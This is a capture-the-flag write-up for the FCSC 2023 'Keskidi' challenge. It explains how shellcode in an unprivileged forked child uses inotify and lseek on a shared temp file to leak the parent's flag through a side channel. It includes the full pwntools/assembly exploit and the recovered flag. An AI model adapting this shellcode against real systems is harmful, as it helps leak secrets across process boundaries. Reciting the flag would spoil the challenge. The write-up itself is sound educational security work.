# FCSC 2023 : Keskidi writeup

## Brief Summary
Essentially, we have an executable which calls `fork()`, the child process is unprivileged and runs some user provided shellcode, while the parent process does some operations on a temporary file (accessible from both processes via  a file descriptor) based on the content of the flag.

*Note: For convenience I added symbols using objcopy into a new binary `keskidi_s` , and I refer to them in this WU for clarity*

## Before forking

- The program creates a temporary file, saves its fd `tmp_fd` in the `.bss` at `tmp_fd`
- It then generates 4096 bytes that are then copied into the temporary file, and into the `.bss` at `tmp_buff`.

*Note: because there are only 255 non-null possibles chars, and we generate 4096 bytes, given a flag character, it is extremely unlikely that the buffer and temporary file do not contain it at least once.*

## After forking 
### What is the parent process doing ?

First, the parent opens `flag.txt`, copies its content to a local buffer `flag_buf`
Then it follows this procedure (decompilation from ghidra + variables renamed)

```C
  len_flag = strlen(flag_buf);
  for (i = 0; i < (int)len_flag; i = i + 1) {
    head = &tmp_buff;
    do {
      head = (undefined *)memchr(head,(int)flag_buf[i],0x1000 - (long)(head + -0x4060));
      if (head != (undefined *)0x0) {
        lseek(tmp_fd,(__off_t)(head + -0x4060),0);
        write(tmp_fd,&zero,1);
        syncfs(tmp_fd);
        head = head + 1;
      }
    } while (head != (undefined *)0x0);
  }
  flag_fd = close(tmp_fd);
```

Relevant things to note :
- each time a character is written, `syncfs()` is called, which ensures the write is propagated to the file system
- at each write, the position indicator of the tmp file is set by to some value, say `j-1`, by the `lseek` call, then to `j` by the call to `write()`
- We have that `flag[i]==tmp_buff[j-1]`

### What is the child process doing ?

It's quite straightforward, a user provided shellcode of length at most 256 bytes is ran into a freshly mmaped region in memory of size 256 bytes. At shellcode execution, this region is not writable.

## The Idea
Everytime a call to `syncfs` is used in the parent we output the corresponding flag character in the child, by peeking into `tmp_buffer`, using the head of the position indicator file, which we can get using an `lseek(tmp_fd,0,SEEK_CUR)` syscall. 

By looking into gdb, I found that tmp_fd is reliably equals to 4, and saw that `SEEK_CUR = 2` by compiling then running an appropriate C code that prints it.

The `inotify` API is exactly what we are looking for to peek on writes on a file. It is a family of syscalls which allow for monitoring of the filesystem.

Calling `inotify_init()` will return a special file descriptor, say `ifd`, that is blocking on `read` (stops execution) until an event happens.

Then, calling `inotify_add_watch(ifd,'/proc/self/fd/4',IN_MODIFY)` will make it so that modification events (IN_MODIFY) on the temporary file (accessible via `'/proc/self/fd/4'` filename) will be registered in ifd

Reading from `ifd` will block until a new event has been registered.

So the idea is to have a loop in the child, in which at each iteration we do the following :
- wait for a write event (ie, read from `ifd`)
- retrieve the position indicator `j` of tmp_fd via `lseek`, 
- write `tmp_buff[j-1]` to `stdout`

Easy right ? Except that if a character is found multiple times in the `tmp_buffer`, there will be multiple writes for this character into the tmp file.

To circumvent this issue, I made the assumption (which luckily turned out to be right :P) that no two consecutive flag characters are equal, and so I adjusted the shellcode to only print a character to stdout if it is different from the previous.

## Exploit

Here is the bulk of the exploit.
I had to run it a number of times because sometimes some characters are missed

```python
ret_addr_off = 0x13c0
tmp_buff_off = 0x4060
tmp_buff_fd = 0x4040
tmp_fd = 4
tmp_name = b'/proc/self/fd/4\x00'
sc = b''

sc += asm(
        f"""
        pop r8
        add r8, {tmp_buff_off - ret_addr_off}
        
        xor rax, rax
        add al, 253
        syscall

        mov rdi, rax
        mov r10, {int.from_bytes(tmp_name[8:],'little')}
        push r10
        mov r10, {int.from_bytes(tmp_name[:8],'little')}
        push r10
        mov rsi, rsp
        mov rdx, 2
        xor rax, rax
        add al, 254
        syscall
        mov rcx, rax

        mov rbx, rdi
        xor r9, r9
        peek:
            mov rdi, rbx
            mov rdx, 16
            xor rax, rax
            syscall

            mov rdi, 4
            xor rsi, rsi
            mov rdx, 1
            xor rax, rax
            add al, 8
            syscall

            mov rax, QWORD PTR [rax - 1 +r8]
            push rax
            shl rax,56
            cmp rax,r9
            je peek

            mov r9, rax
            
            mov rdi, 1
            mov rsi, rsp
            mov rdx, 1
            xor rax, rax
            add al, 1
            syscall

            cmp r8, r8
            je peek
        """
        )
        
io = start()
io.send(sc + b"\n")
io.interactive()
```

## FLAG
```
[*] '/home/skuuk/fcsc23/keskidi/keskidi_s'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to challenges.france-cybersecurity-challenge.fr on port 2103: Done
[*] Switching to interactive mode
FCSC{5cda7f51ba4724231c8eb5a29c970423b73a7d462e3075ed39ec3ab5d3fbc4e8}[*] Got EOF while reading in interactive
$ 
```



